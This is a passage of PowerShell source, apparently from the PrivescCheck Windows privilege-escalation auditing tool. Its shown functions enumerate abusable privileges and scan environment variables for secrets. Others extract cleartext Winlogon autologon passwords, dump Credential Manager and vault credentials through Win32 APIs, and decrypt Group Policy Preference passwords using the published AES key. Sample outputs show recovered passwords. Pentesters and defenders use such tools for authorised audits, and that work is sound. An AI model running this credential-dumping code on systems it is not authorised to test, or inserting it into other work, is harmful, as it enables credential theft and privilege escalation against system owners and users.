            ForEach ($Pattern in $IgnoredGroupSidPatterns) {
                if ($GroupSid -like $Pattern) {
                    Write-Verbose "Known SID pattern: $GroupSid"
                    $KnownSid = $true
                    break   
                }
            }

            if (-not $KnownSid) {

                if ($GroupSid -notmatch '^S-1-5.*') {
                    $GroupName = ($Group.Translate([System.Security.Principal.NTAccount])).Value
                } else {
                    $GroupName = "N/A"
                }

                $UserGroups = New-Object -TypeName PSObject 
                $UserGroups | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $GroupName 
                $UserGroups | Add-Member -MemberType "NoteProperty" -Name "SID" -Value $GroupSid
                $UserGroups
            }
        } else {
            Write-Verbose "Known SID: $GroupSid"
        }
    }
}

function Invoke-UserPrivilegesCheck {
    <#
    .SYNOPSIS
    
    Enumerates privileges which can be abused for privilege escalation

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Enumerates all the privileges of the current user thanks to the custom Get-UserPrivileges
    function. Then, it checks whether each privilege is contained in a pre-defined list of 
    high value privileges. 
    
    .EXAMPLE

    Name                   State   Description
    ----                   -----   -----------
    SeImpersonatePrivilege Enabled Impersonate a client after authentication
    
    #>

    [CmdletBinding()] param()    

    $HighPotentialPrivileges = "SeAssignPrimaryTokenPrivilege", "SeImpersonatePrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeLoadDriverPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeBackupPrivilege", "SeShutdownPrivilege"

    $CurrentPrivileges = Get-UserPrivileges

    ForEach ($Privilege in $CurrentPrivileges) {

        if ($HighPotentialPrivileges -contains $Privilege.Name) {

            $Privilege
        }
    }
}

function Invoke-UserEnvCheck {
    <#
    .SYNOPSIS

    Checks for sensitive data in environment variables

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Environment variables may contain sensitive information such as database credentials or API 
    keys. 
    
    #>

    [CmdletBinding()] param() 

    [string[]] $Keywords = "key", "passw", "secret", "pwd", "creds", "credential", "api"

    Get-ChildItem -Path env: | ForEach-Object {

        $EntryName = $_.Name
        $EntryValue = $_.Value 
        $CheckVal = "$($_.Name) $($_.Value)"
        
        ForEach ($Keyword in $Keywords) {

            if ($CheckVal -Like "*$($Keyword)*") {

                $EnvItem = New-Object -TypeName PSObject 
                $EnvItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $EntryName
                $EnvItem | Add-Member -MemberType "NoteProperty" -Name "Value" -Value $EntryValue
                $EnvItem | Add-Member -MemberType "NoteProperty" -Name "Keyword" -Value $Keyword
                $EnvItem
            }
        }
    }
}
# ----------------------------------------------------------------
# END CURRENT USER    
# ----------------------------------------------------------------


# ----------------------------------------------------------------
# BEGIN CREDENTIALS     
# ----------------------------------------------------------------
function Invoke-WinlogonCheck {
    <#
    .SYNOPSIS

    Checks credentials stored in the Winlogon registry key
    
    Author: @itm4n
    License: BSD 3-Clause

    .DESCRIPTION

    Windows has a registry setting to enable automatic logon. You can set a username and a password
    in order to automatically initiate a user session on system startup. The password is stored in
    clear text so it's easy to extract it. This function returns a set of credentials only if the 
    password field is not empty.
    
    .EXAMPLE

    PS C:\> Invoke-WinlogonCheck

    Domain Username  Password
    ------ --------  --------
           lab-admin

    .LINK

    https://support.microsoft.com/en-us/help/324737/how-to-turn-on-automatic-logon-in-windows
    
    #>

    [CmdletBinding()] param()

    $RegPath = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    $Item = Get-ItemProperty -Path $RegPath -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError

    if (-not $GetItemPropertyError) {

        if ($Item.DefaultPassword) {
            $WinlogonItem = New-Object -TypeName PSObject 
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $Item.DefaultDomainName
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $Item.DefaultUserName
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Item.DefaultPassword
            $WinlogonItem
        } 
    
        if ($Item.AltDefaultPassword) {
            $WinlogonItem = New-Object -TypeName PSObject 
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $Item.AltDefaultDomainName
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $Item.AltDefaultUserName
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Item.AltDefaultPassword
            $WinlogonItem
        }

    } else {
        Write-Verbose "Error while querying '$RegPath'"
    }
}

function Invoke-CredentialFilesCheck {
    <#
    .SYNOPSIS

    List the Credential files that are stored in the current user AppData folders. 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Credentials stored in the Credential Manager are actually saved as files in the current user's
    home folder. The sensitive information is saved in an ecnrypted format which differs depending
    on the credential type. 
    
    .EXAMPLE

    PS C:\> Invoke-CredentialFilesCheck

    FullPath
    ------
    C:\Users\lab-user\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    C:\Users\lab-user\AppData\Roaming\Microsoft\Credentials\9751D70B4AC36953347138F9A5C2D23B
    C:\Users\lab-user\AppData\Roaming\Microsoft\Credentials\9970C9D5A29B2D83514BEFD30A4D48B4
    
    #>
    
    [CmdletBinding()] param()

    $CredentialsFound = $False

    $Paths = New-Object -TypeName System.Collections.ArrayList
    [void] $Paths.Add($(Join-Path -Path $env:LOCALAPPDATA -ChildPath "Microsoft\Credentials"))
    [void] $Paths.Add($(Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Credentials"))

    ForEach ($Path in [string[]]$Paths) {

        Get-ChildItem -Force -Path $Path -ErrorAction SilentlyContinue | ForEach-Object {

            $Result = New-Object -TypeName PSObject 
            $Result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Credentials"
            $Result | Add-Member -MemberType "NoteProperty" -Name "FullPath" -Value $_.FullName
            $Result

            if (-not $CredentialsFound) { $CredentialsFound = $True }
        }
    }

    if ($CredentialsFound) {

        $CurrentUser = Invoke-UserCheck

        if ($CurrentUser -and $CurrentUser.SID) {
    
            $Paths = New-Object -TypeName System.Collections.ArrayList
            [void] $Paths.Add($(Join-Path -Path $env:LOCALAPPDATA -ChildPath "Microsoft\Protect\$($CurrentUser.SID)"))
            [void] $Paths.Add($(Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Protect\$($CurrentUser.SID)"))
    
            ForEach ($Path in [string[]]$Paths) {
    
                Get-ChildItem -Force -Path $Path -ErrorAction SilentlyContinue | Where-Object {$_.Name.Length -eq 36 } | ForEach-Object {
        
                    $Result = New-Object -TypeName PSObject 
                    $Result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Protect"
                    $Result | Add-Member -MemberType "NoteProperty" -Name "FullPath" -Value $_.FullName
                    $Result
                }
            }
        } 
    } 
}

function Invoke-VaultCredCheck {
    <#
    .SYNOPSIS

    Enumerates the credentials saved in the Credential Manager.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Credentials saved in the Credential Manager can be extracted by invoking the Win32 CredEnumerate
    function. This function returns a pointer to an array of PCREDENTIAL pointers. Therefore we can
    iterate this array to access each CREDENTIAL structure individually. Depending on the type of 
    credential, the CredentialBlob member either contains the cleartext password or a blob which we
    cannot decode (because it's application specific). For each structure, a custom PS object is 
    returned. The output should be quite similar to the output generated by the command vault::cred
    in M*m*k*tz (don't want to trigger AMSI with this keyword :P).
    
    .EXAMPLE

    PS C:\> Invoke-VaultCredCheck

    TargetName : Domain:target=192.168.0.10
    UserName   : LAB-PC\lab-user
    Comment    : SspiPfc
    Type       : 2 - DOMAIN_PASSWORD
    Persist    : 3 - ENTERPRISE
    Flags      : 0
    Credential :
    
    TargetName : LegacyGeneric:target=https://github.com/
    UserName   : user@example.com
    Comment    :
    Type       : 1 - GENERIC
    Persist    : 2 - LOCAL_MACHINE
    Flags      : 0
    Credential : dBa2F06TTsrvSeLbyoW8

    .LINK

    https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratew
    https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials

    #>
    
    [CmdletBinding()] param()

    function Convert-TypeToString {
        [CmdletBinding()] param(
            [Uint32]$Type 
        )

        $TypeEnum = @{
            "GENERIC"                   = "1";
            "DOMAIN_PASSWORD"           = "2";
            "DOMAIN_CERTIFICATE"        = "3";
            "DOMAIN_VISIBLE_PASSWORD"   = "4"; #  This value is no longer supported. 
            "GENERIC_CERTIFICATE"       = "5"; #  This value is no longer supported.
            "DOMAIN_EXTENDED"           = "6"; #  This value is no longer supported.
            "MAXIMUM"                   = "7"; #  This value is no longer supported.
            "TYPE_MAXIMUM_EX"           = "8"; #  This value is no longer supported.
        }
    
        $TypeEnum.GetEnumerator() | ForEach-Object { 
            if ( $_.Value -eq $Type ) 
            {
                $_.Name
            }
        }
    }

    function Convert-PersistToString {
        [CmdletBinding()] param(
            [Uint32]$Persist 
        )

        $PersistEnum = @{
            "SESSION" = "1";
            "LOCAL_MACHINE" = "2";
            "ENTERPRISE" = "3";
        }

        $PersistEnum.GetEnumerator() | ForEach-Object { 
            if ( $_.Value -eq $Persist ) 
            {
                $_.Name
            }
        }
    }

    function Get-Credential {
        [CmdletBinding()] param(
            [PrivescCheck.Win32+CREDENTIAL]$RawObject
        )

        if (-not ($RawObject.CredentialBlobSize -eq 0)) {

            $UnicodeString = New-Object -TypeName "PrivescCheck.Win32+UNICODE_STRING"
            $UnicodeString.Length = $RawObject.CredentialBlobSize
            $UnicodeString.MaximumLength = $RawObject.CredentialBlobSize
            $UnicodeString.Buffer = $RawObject.CredentialBlob

            $TestFlags = 2 # IS_TEXT_UNICODE_STATISTICS
            $IsUnicode = [PrivescCheck.Win32]::IsTextUnicode($UnicodeString.Buffer, $UnicodeString.Length, [ref]$TestFlags)
            
            if ($IsUnicode) {
                $Result = [Runtime.InteropServices.Marshal]::PtrToStringUni($UnicodeString.Buffer, $UnicodeString.Length / 2)
            } else {
                for ($i = 0; $i -lt $UnicodeString.Length; $i++) {
                    $BytePtr = [IntPtr] ($UnicodeString.Buffer.ToInt64() + $i)
                    $Byte = [Runtime.InteropServices.Marshal]::ReadByte($BytePtr)
                    $Result += "{0:X2} " -f $Byte
                }
            }

            $Result
        }
    }

    # CRED_ENUMERATE_ALL_CREDENTIALS = 0x1
    $Count = 0;
    [IntPtr]$CredentialsPtr = [IntPtr]::Zero
    $Success = [PrivescCheck.Win32]::CredEnumerate([IntPtr]::Zero, 1, [ref]$Count, [ref]$CredentialsPtr)
    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if ($Success) {

        Write-Verbose "CredEnumerate() OK - Count: $($Count)"

        # CredEnumerate() returns an array of $Count PCREDENTIAL pointers, so we need to iterate
        # this array in order to get each PCREDENTIAL pointer. Then we can use this pointer to 
        # convert a blob of unmanaged memory to a PrivescCheck.Win32+CREDENTIAL object.

        for ($i = 0; $i -lt $Count; $i++) {

            $CredentialPtrOffset = [IntPtr] ($CredentialsPtr.ToInt64() + [IntPtr]::Size * $i)
            $CredentialPtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($CredentialPtrOffset) 
            $Credential = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CredentialPtr, [type] [PrivescCheck.Win32+CREDENTIAL])
            $CredentialStr = Get-Credential -RawObject $Credential

            if (-not [String]::IsNullOrEmpty($CredentialStr)) {
                $CredentialObject = New-Object -TypeName PSObject 
                $CredentialObject | Add-Member -MemberType "NoteProperty" -Name "TargetName" -Value $Credential.TargetName
                $CredentialObject | Add-Member -MemberType "NoteProperty" -Name "UserName" -Value $Credential.UserName
                $CredentialObject | Add-Member -MemberType "NoteProperty" -Name "Comment" -Value $Credential.Comment
                $CredentialObject | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "$($Credential.Type) - $(Convert-TypeToString -Type $Credential.Type)"
                $CredentialObject | Add-Member -MemberType "NoteProperty" -Name "Persist" -Value "$($Credential.Persist) - $(Convert-PersistToString -Persist $Credential.Persist)"
                $CredentialObject | Add-Member -MemberType "NoteProperty" -Name "Flags" -Value "0x$($Credential.Flags.ToString('X8'))"
                $CredentialObject | Add-Member -MemberType "NoteProperty" -Name "Credential" -Value $CredentialStr
                $CredentialObject
            }
        }

        [PrivescCheck.Win32]::CredFree($CredentialsPtr) 

    } else {
        # If there is no saved credentials, CredEnumerate sets the last error to ERROR_NOT_FOUND 
        # but this doesn't mean that the function really failed. The same thing applies for 
        # the error code ERROR_NO_SUCH_LOGON_SESSION.
        Write-Verbose ([ComponentModel.Win32Exception] $LastError)
    }
}

function Invoke-VaultListCheck {
    <#
    .SYNOPSIS

    Enumerates web credentials saved in the Credential Manager.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Credentials saved in Internet Explorer or Edge for example are actually saved in the system's 
    Credential Manager. These credentials can be extracted using undocumented Windows API functions
    from "vaultcli.dll". It's highly inspired from the "vault::list" command of M*m*k*tz (by 
    Benjamin Delpy @gentilkiwi) and "Get-VaultCredential.ps1" (by Matthew Graeber @mattifestation). 
    Only entries containing a non-empty password field are returned as a custom PS object. 

    .EXAMPLE

    PS C:\> Invoke-VaultListCheck

    Type        : Web Credentials
    TargetName  : https://github.com/
    UserName    : foo123@example.com
    Credential  : foo123
    LastWritten : 01/01/1970 13:37:00

    .LINK

    https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_vault.c
    https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Get-VaultCredential.ps1

    #>
    

    [CmdletBinding()] param()

    function Get-VaultNameFromGuid {
        [CmdletBinding()] param(
            [Guid] $VaultGuid
        )

        $VaultSchemaEnum = @{
            ([Guid] '2F1A6504-0641-44CF-8BB5-3612D865F2E5') = 'Windows Secure Note'
            ([Guid] '3CCD5499-87A8-4B10-A215-608888DD3B55') = 'Windows Web Password Credential'
            ([Guid] '154E23D0-C644-4E6F-8CE6-5069272F999F') = 'Windows Credential Picker Protector'
            ([Guid] '4BF4C442-9B8A-41A0-B380-DD4A704DDB28') = 'Web Credentials'
            ([Guid] '77BC582B-F0A6-4E15-4E80-61736B6F3B29') = 'Windows Credentials'
            ([Guid] 'E69D7838-91B5-4FC9-89D5-230D4D4CC2BC') = 'Windows Domain Certificate Credential'
            ([Guid] '3E0E35BE-1B77-43E7-B873-AED901B6275B') = 'Windows Domain Password Credential'
            ([Guid] '3C886FF3-2669-4AA2-A8FB-3F6759A77548') = 'Windows Extended Credential'
        }

        $VaultSchemaEnum[$VaultGuid]
    }

    # Highly inspired from "Get-VaultCredential.ps1", credit goes to Matthew Graeber (@mattifestation)
    # https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Get-VaultCredential.ps1
    function Get-VaultItemElementValue {
        [CmdletBinding()] param(
            [IntPtr] $VaultItemElementPtr
        )

        if ($VaultItemElementPtr -eq [IntPtr]::Zero) {
            return
        }

        $VaultItemDataHeader = [Runtime.InteropServices.Marshal]::PtrToStructure($VaultItemElementPtr, [type] [PrivescCheck.Win32+VAULT_ITEM_DATA_HEADER])
        $VaultItemDataValuePtr = [IntPtr] ($VaultItemElementPtr.ToInt64() + 16)

        switch ($VaultItemDataHeader.Type) {

            # ElementType_Boolean
            0x00 {
                [Bool] [Runtime.InteropServices.Marshal]::ReadByte($VaultItemDataValuePtr)
            }

            # ElementType_Short
            0x01 {
                [Runtime.InteropServices.Marshal]::ReadInt16($VaultItemDataValuePtr)
            }

            # ElementType_UnsignedShort
            0x02 {
                [Runtime.InteropServices.Marshal]::ReadInt16($VaultItemDataValuePtr)
            }

            # ElementType_Integer
            0x03 {
                [Runtime.InteropServices.Marshal]::ReadInt32($VaultItemDataValuePtr)
            }

            # ElementType_UnsignedInteger
            0x04 {
                [Runtime.InteropServices.Marshal]::ReadInt32($VaultItemDataValuePtr)
            }

            # ElementType_Double
            0x05 {
                [Runtime.InteropServices.Marshal]::PtrToStructure($VaultItemDataValuePtr, [Type] [Double])
            }

            # ElementType_Guid
            0x06 {
                [Runtime.InteropServices.Marshal]::PtrToStructure($VaultItemDataValuePtr, [Type] [Guid])
            }

            # ElementType_String
            0x07 { 
                $StringPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr($VaultItemDataValuePtr)
                [Runtime.InteropServices.Marshal]::PtrToStringUni($StringPtr)
            }

            # ElementType_ByteArray
            0x08 {

            }

            # ElementType_TimeStamp
            0x09 {

            }

            # ElementType_ProtectedArray
            0x0a {

            }

            # ElementType_Attribute
            0x0b {

            }

            # ElementType_Sid
            0x0c {
                $SidPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr($VaultItemDataValuePtr)
                $SidObject = [Security.Principal.SecurityIdentifier] ($SidPtr)
                $SidObject.Value
            }

            # ElementType_Max
            0x0d {
                
            }
        }
    }

    $VaultsCount = 0
    $VaultGuids = [IntPtr]::Zero 
    $Result = [PrivescCheck.Win32]::VaultEnumerateVaults(0, [ref]$VaultsCount, [ref]$VaultGuids)

    if ($Result -eq 0) {

        Write-Verbose "VaultEnumerateVaults() OK - Count: $($VaultsCount)"

        for ($i = 0; $i -lt $VaultsCount; $i++) {

            $VaultGuidPtr = [IntPtr] ($VaultGuids.ToInt64() + ($i * [Runtime.InteropServices.Marshal]::SizeOf([Type] [Guid])))
            $VaultGuid = [Runtime.InteropServices.Marshal]::PtrToStructure($VaultGuidPtr, [type] [Guid])
            $VaultName = Get-VaultNameFromGuid -VaultGuid $VaultGuid

            Write-Verbose "Vault: $($VaultGuid) - $($VaultName)"

            $VaultHandle = [IntPtr]::Zero 
            $Result = [PrivescCheck.Win32]::VaultOpenVault($VaultGuidPtr, 0, [ref]$VaultHandle)

            if ($Result -eq 0) {

                Write-Verbose "VaultOpenVault() OK - Vault Handle: 0x$($VaultHandle.ToString('X8'))"

                $VaultItemsCount = 0
                $ItemsPtr = [IntPtr]::Zero 
                $Result = [PrivescCheck.Win32]::VaultEnumerateItems($VaultHandle, 0x0200, [ref]$VaultItemsCount, [ref]$ItemsPtr)

                $VaultItemPtr = $ItemsPtr

                if ($Result -eq 0) {

                    Write-Verbose "VaultEnumerateItems() OK - Items Count: $($VaultItemsCount)"

                    $OSVersion = [Environment]::OSVersion.Version

                    try {

                        for ($j = 0; $j -lt $VaultItemsCount; $j++) {

                            if ($OSVersion.Major -le 6 -and $OSVersion.Minor -le 1) {
                                # Windows 7
                                $VaultItemType = [type] [PrivescCheck.Win32+VAULT_ITEM_7]
                            } else {
                                # Windows 8+
                                $VaultItemType = [type] [PrivescCheck.Win32+VAULT_ITEM_8]
                            }
    
                            $VaultItem = [Runtime.InteropServices.Marshal]::PtrToStructure($VaultItemPtr, [type] $VaultItemType)
    
                            if ($OSVersion.Major -le 6 -and $OSVersion.Minor -le 1) {
                                # Windows 7
                                $PasswordItemPtr = [IntPtr]::Zero
                                $Result = [PrivescCheck.Win32]::VaultGetItem7($VaultHandle, [ref]$VaultItem.SchemaId, $VaultItem.Resource, $VaultItem.Identity, [IntPtr]::Zero, 0, [ref]$PasswordItemPtr)
                            } else {
                                # Windows 8+
                                $PasswordItemPtr = [IntPtr]::Zero
                                $Result = [PrivescCheck.Win32]::VaultGetItem8($VaultHandle, [ref]$VaultItem.SchemaId, $VaultItem.Resource, $VaultItem.Identity, $VaultItem.PackageSid, [IntPtr]::Zero, 0, [ref]$PasswordItemPtr)
                            }
    
                            if ($Result -eq 0) {

                                Write-Verbose "VaultGetItem() OK - ItemPtr: 0x$($PasswordItemPtr.ToString('X8'))"
                                $PasswordItem = [Runtime.InteropServices.Marshal]::PtrToStructure($PasswordItemPtr, [Type] $VaultItemType)
                                $Password = Get-VaultItemElementValue -VaultItemElementPtr $PasswordItem.Authenticator
                                [PrivescCheck.Win32]::VaultFree($PasswordItemPtr) | Out-Null 

                            } else {
                                Write-Verbose "VaultGetItem() failed - Err: 0x$($Result.ToString('X8'))"
                            }
    
                            if (-not [String]::IsNullOrEmpty($Password)) {
                                $Item = New-Object -TypeName PSObject
                                $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $VaultName
                                $Item | Add-Member -MemberType "NoteProperty" -Name "TargetName" -Value $(Get-VaultItemElementValue -VaultItemElementPtr $VaultItem.Resource)
                                $Item | Add-Member -MemberType "NoteProperty" -Name "UserName" -Value $(Get-VaultItemElementValue -VaultItemElementPtr $VaultItem.Identity)
                                $Item | Add-Member -MemberType "NoteProperty" -Name "Credential" -Value $Password
                                $Item | Add-Member -MemberType "NoteProperty" -Name "LastWritten" -Value $([DateTime]::FromFileTimeUtc($VaultItem.LastWritten))
                                $Item
                            }

                            $VaultItemPtr = [IntPtr] ($VaultItemPtr.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] $VaultItemType))
                        }

                    } catch [Exception] {
                        Write-Verbose $_.Exception.Message 
                    }

                } else {
                    Write-Verbose "VaultEnumerateItems() failed - Err: 0x$($Result.ToString('X8'))"
                }

                [PrivescCheck.Win32]::VaultCloseVault([ref]$VaultHandle) | Out-Null 

            } else {
                Write-Verbose "VaultOpenVault() failed - Err: 0x$($Result.ToString('X8'))"
            }
        }

    } else {
        Write-Verbose "VaultEnumerateVaults() failed - Err: 0x$($Result.ToString('X8'))"
    }
}

function Invoke-GPPPasswordCheck {
    <#
    .SYNOPSIS

    Lists Group Policy Preferences (GPP) containing a non-empty "cpassword" field

    Author: @itm4n
    Credit: @obscuresec, @harmj0y
    License: BSD 3-Clause
    
    .DESCRIPTION

    Before KB2928120 (see MS14-025), some Group Policy Preferences could be configured with a 
    custom account. This feature was mainly used to deploy a custom local administrator account on
    a group of machines. There were two problems with this approach though. First, since the Group 
    Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second 
    problem is that the password set in these GPPs is AES256-encrypted with a default key, which 
    is publicly documented. This means that any authenticated user could potentially access very 
    sensitive data and elevate their privileges on their machine or even the domain. 

    This function will check whether any locally cached GPP file contains a non-empty "cpassword" 
    field. If so, it will decrypt it and return a custom PS object containing some information 
    about the GPP along with the location of the file. 
    
    .PARAMETER Remote

    Set this flag if you want to search for GPP files in the SYSVOL share of your primary Domain
    Controller. Initially, I wanted to do only local checks but this was a special request from
    @mpgn_x64 so I couldn't say no :P.
    
    .EXAMPLE

    PS C:\> Invoke-GPPPasswordCheck

    Type     : Mapped Drive
    UserName : shareuser
    Password : S3cur3Shar3
    Content  : Path: \\evilcorp.lab\SecureShare
    Changed  : 2020-02-09 14:03:57
    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{3A61470B-FD38-462A-A2E2-FC279A2754AE}\S-1-5-21-2135246055-3766984803-592010092-1103\Preferences\Drives\Drives.xml

    Type     : Data Source
    UserName : datasource
    Password : S0urce0fThePr0blem
    Content  : DSN: source
    Changed  : 2020-02-09 12:23:43
    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{3FC99437-7C06-491A-8EBC-786CDA055862}\S-1-5-21-2135246055-3766984803-592010092-1103\Preferences\DataSources\DataSources.xml

    Type     : Service
    UserName : EVILCORP\SvcControl
    Password : S3cr3tS3rvic3
    Content  : Name: CustomService
    Changed  : 2020-02-09 12:16:18
    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{66E11622-15A4-40B7-938C-FAD43AF1F572}\Machine\Preferences\Services\Services.xml

    Type     : Scheduled Task
    UserName : EVILCORP\SvcCustomTask
    Password : T4skM4ster
    Content  : App: C:\windows\system32\cmd.exe
    Changed  : 2020-02-09 12:20:50
    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{6E9805DA-4CFC-47AC-BFC4-216FED08D39E}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml

    Type     : User/Group
    UserName : LocalAdmin
    Password : $uper$ecureP4ss
    Content  : Description: Super secure local admin account
    Changed  : 2020-02-09 12:09:59
    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{8B95814A-23A2-4FB7-8BBA-53745EA1F11C}\Machine\Preferences\Groups\Groups.xml

    .LINK

    https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
    https://adsecurity.org/?p=2288
    https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025
    https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati

    #>

    [CmdletBinding()] param(
        [switch]$Remote
    )

    try {
        Add-Type -Assembly System.Security
        Add-Type -Assembly System.Core
    } catch {
        # do nothing
    }

    function Get-DecryptedPassword {
        [CmdletBinding()] param(
            [string] $Cpassword 
        )

        if (-not [String]::IsNullOrEmpty($Cpassword)) {

            $Mod = $Cpassword.Length % 4
            if ($Mod -gt 0) {
                $Cpassword += "=" * (4 - $Mod)
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)

            try {

                $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

                $AesIV = New-Object Byte[]($AesObject.IV.Length) 
                $AesObject.IV = $AesIV
                $AesObject.Key = $AesKey
                $DecryptorObject = $AesObject.CreateDecryptor() 
                [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

                [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)

            } catch [Exception] {
                Write-Verbose $_.Exception.Message
            }
        }
    }

    if ($Remote) {
        $GppPath = "\\$($Env:USERDNSDOMAIN)\SYSVOL"
    } else {
        $GppPath = $Env:ALLUSERSPROFILE
        if ($GppPath -notmatch "ProgramData") {
            $GppPath = Join-Path -Path $GppPath -ChildPath "Application Data"
        } else {
            $GppPath = Join-Path -Path $GppPath -ChildPath "Microsoft\Group Policy"
        }
    }
    
    if (Test-Path -Path $GppPath -ErrorAction SilentlyContinue) {

        $CachedGPPFiles = Get-ChildItem -Path $GppPath -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Drives.xml','Printers.xml' -Force -ErrorAction SilentlyContinue

        foreach ($File in $CachedGPPFiles) {
            
            $FileFullPath = $File.FullName 
            Write-Verbose $FileFullPath

            try {
                [xml]$XmlFile = Get-Content -Path $FileFullPath -ErrorAction SilentlyContinue
            } catch [Exception] {
                Write-Verbose $_.Exception.Message 
            }

            if ($Null -eq $XmlFile) {
                continue
            }

            $XmlFile.GetElementsByTagName("Properties") | ForEach-Object {

                $Properties = $_ 
                $Cpassword = ""

                switch ($File.BaseName) {

                    Groups {
                        $Type = "User/Group"
                        $UserName = $Properties.userName 
                        $Cpassword = $Properties.cpassword 
                        $Content = "Description: $($Properties.description)"
                    }
    
                    Scheduledtasks {
                        $Type = "Scheduled Task"
                        $UserName = $Properties.runAs 
                        $Cpassword = $Properties.cpassword 
                        $Content = "App: $($Properties.appName) $($Properties.args)"
                    }
    
                    DataSources {
                        $Type = "Data Source"
                        $UserName = $Properties.username 
                        $Cpassword = $Properties.cpassword 
                        $Content = "DSN: $($Properties.dsn)"
                    }
    
                    Drives {
                        $Type = "Mapped Drive"
                        $UserName = $Properties.userName 
                        $Cpassword = $Properties.cpassword 
                        $Content = "Path: $($Properties.path)"
                    }
    
                    Services {
                        $Type = "Service"
                        $UserName = $Properties.accountName 
                        $Cpassword = $Properties.cpassword 
                        $Content = "Name: $($Properties.serviceName)"
                    }

                    Printers {
                        $Type = "Printer"
                        $UserName = $Properties.username 
                        $Cpassword = $Properties.cpassword 
                        $Content = "Path: $($Properties.path)"
                    }
                }

                if (-not [String]::IsNullOrEmpty($Cpassword)) {
                    $Item = New-Object -TypeName PSObject
                    $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $Type
                    $Item | Add-Member -MemberType "NoteProperty" -Name "UserName" -Value $UserName
                    $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $(Get-DecryptedPassword -Cpassword $Cpassword)
                    $Item | Add-Member -MemberType "NoteProperty" -Name "Content" -Value $Content
                    $Item | Add-Member -MemberType "NoteProperty" -Name "Changed" -Value $Properties.ParentNode.changed
                    $Item | Add-Member -MemberType "NoteProperty" -Name "FilePath" -Value $FileFullPath
                    $Item
                }
            }
        }
    }
}
# ----------------------------------------------------------------
# END CREDENTIALS     
# ----------------------------------------------------------------

# ----------------------------------------------------------------
# BEGIN SENSITIVE FILES 
# ----------------------------------------------------------------
function Invoke-SamBackupFilesCheck {
    <#
    .SYNOPSIS

    Checks common locations for the SAM/SYSTEM backup files and checks whether the current
    user can read them.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The SAM/SYSTEM registry hives are stored as files in a known location:
    'C:\windows\System32\config'. These files are locked by default so even SYSTEM can't read them
    when the system is running. However, copies of these files can be created in other folders so
    it's worth checking if these files are accessible. 
    
    #>
    
    [CmdletBinding()] param()

    $ArrayOfPaths = New-Object System.Collections.ArrayList 
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "repair\SAM"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\RegBack\SAM"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\SAM"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "repair\system"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\SYSTEM"))
